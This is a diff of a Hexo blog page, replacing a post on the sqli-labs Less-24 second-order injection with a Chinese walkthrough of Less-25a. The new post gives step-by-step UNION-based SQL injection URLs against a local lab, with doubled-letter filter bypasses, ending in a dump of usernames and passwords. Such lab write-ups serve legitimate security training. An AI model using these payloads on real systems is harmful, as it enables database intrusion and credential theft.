@@ -5,24 +5,19 @@
   
 
   
-  <title>sql-labs-Less-24 | Hexo</title>
+  <title>sql-labs-Less-25a | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-24&#x2F; 注册一个新账号：admin’#,密码：123 再登录，然后把密码改成123456,改好后再用admin，123456登录。 登陆成功。查看数据库：  小结 https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;3fe7904683ac https:&#x2F;&#x2F;www.cnblogs.com&#x2F;cute-puli&#x2F;p&#x2F;11145758.html">
+  <meta name="description" content="进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-25a&#x2F;，输入?id&#x3D;1,正常，在输入&#39;，出现错误，但没有报错，说明不能用报错注入。查看源代码得知这关没有对id进行包裹，所以是整数型注入，还把大小写的‘or’和‘and’进行了过滤。可以用联合注入和延时注入。这里用联合注入：查列数：http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-25a&#x2F;?id&#x3D;1 oorrder by 3–+测">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sql-labs-Less-24">
-<meta property="og:url" content="http://example.com/2021/02/14/sql-labs-Less-24/index.html">
+<meta property="og:title" content="sql-labs-Less-25a">
+<meta property="og:url" content="http://example.com/2021/02/16/sql-labs-Less-25a/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-24&#x2F; 注册一个新账号：admin’#,密码：123 再登录，然后把密码改成123456,改好后再用admin，123456登录。 登陆成功。查看数据库：  小结 https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;3fe7904683ac https:&#x2F;&#x2F;www.cnblogs.com&#x2F;cute-puli&#x2F;p&#x2F;11145758.html">
+<meta property="og:description" content="进入http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-25a&#x2F;，输入?id&#x3D;1,正常，在输入&#39;，出现错误，但没有报错，说明不能用报错注入。查看源代码得知这关没有对id进行包裹，所以是整数型注入，还把大小写的‘or’和‘and’进行了过滤。可以用联合注入和延时注入。这里用联合注入：查列数：http:&#x2F;&#x2F;127.0.0.1&#x2F;sql&#x2F;Less-25a&#x2F;?id&#x3D;1 oorrder by 3–+测">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/1.png">
-<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/2.png">
-<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/3.png">
-<meta property="og:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/4.png">
-<meta property="article:published_time" content="2021-02-14T06:11:13.000Z">
-<meta property="article:modified_time" content="2021-02-14T12:25:35.163Z">
+<meta property="article:published_time" content="2021-02-16T06:03:16.000Z">
+<meta property="article:modified_time" content="2021-02-16T08:15:13.032Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/1.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -71,10 +66,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-sql-labs-Less-24" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-sql-labs-Less-25a" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2021/02/14/sql-labs-Less-24/" class="article-date">
-  <time datetime="2021-02-14T06:11:13.000Z" itemprop="datePublished">2021-02-14</time>
+    <a href="/2021/02/16/sql-labs-Less-25a/" class="article-date">
+  <time datetime="2021-02-16T06:03:16.000Z" itemprop="datePublished">2021-02-16</time>
 </a>
     
   </div>
@@ -85,7 +80,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      sql-labs-Less-24
+      sql-labs-Less-25a
     </h1>
   
 
@@ -93,18 +88,12 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-24/">http://127.0.0.1/sql/Less-24/</a></p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/1.png" alt="1"><br>注册一个新账号：admin’#,密码：123</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/2.png" alt="2"><br>再登录，然后把密码改成123456,改好后再用admin，123456登录。</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/3.png" alt="3"><br>登陆成功。<br>查看数据库：</p>
-<p><img src="https://github.com/yzhk/yzhk.github.io/raw/master/2021/02/14/sql-labs-Less-24/4.png" alt="4"></p>
-<h2>小结</h2>
-https://www.jianshu.com/p/3fe7904683ac
-https://www.cnblogs.com/cute-puli/p/11145758.html
+        <p>进入<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/%EF%BC%8C%E8%BE%93%E5%85%A5?id=1,%E6%AD%A3%E5%B8%B8%EF%BC%8C%E5%9C%A8%E8%BE%93%E5%85%A5&#39;%EF%BC%8C%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%EF%BC%8C%E4%BD%86%E6%B2%A1%E6%9C%89%E6%8A%A5%E9%94%99%EF%BC%8C%E8%AF%B4%E6%98%8E%E4%B8%8D%E8%83%BD%E7%94%A8%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E3%80%82">http://127.0.0.1/sql/Less-25a/，输入?id=1,正常，在输入&#39;，出现错误，但没有报错，说明不能用报错注入。</a><br>查看源代码得知这关没有对id进行包裹，所以是整数型注入，还把大小写的‘or’和‘and’进行了过滤。<br>可以用联合注入和延时注入。<br>这里用联合注入：<br>查列数：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=1">http://127.0.0.1/sql/Less-25a/?id=1</a> oorrder by 3–+<br>测位置：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,2,3–+<br>查库：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,database(),3–+<br>查表：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3–+<br>查列：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3–+<br>查字段：<a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-25a/?id=-1">http://127.0.0.1/sql/Less-25a/?id=-1</a> union select 1,(select group_concat(username) from users),(select group_concat(passwoorrd) from users)–+</p>
+
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/14/sql-labs-Less-24/" data-id="ckl54fzm40000o8uxewbqa1dx" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/16/sql-labs-Less-25a/" data-id="ckl7qekm800006cux4z216qc2" class="article-share-link">Share</a>
       
       
     </footer>
@@ -113,19 +102,10 @@ https://www.cnblogs.com/cute-puli/p/11145758.html
     
 <nav id="article-nav">
   
-    <a href="/2021/02/15/sql-labs-Less-25/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          sql-labs-Less-25
-        
-      </div>
-    </a>
   
-  
-    <a href="/2021/02/13/sql-labs-Less-23/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/02/15/sql-labs-Less-25/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">sql-labs-Less-23</div>
+      <div class="article-nav-title">sql-labs-Less-25</div>
     </a>
   
 </nav>
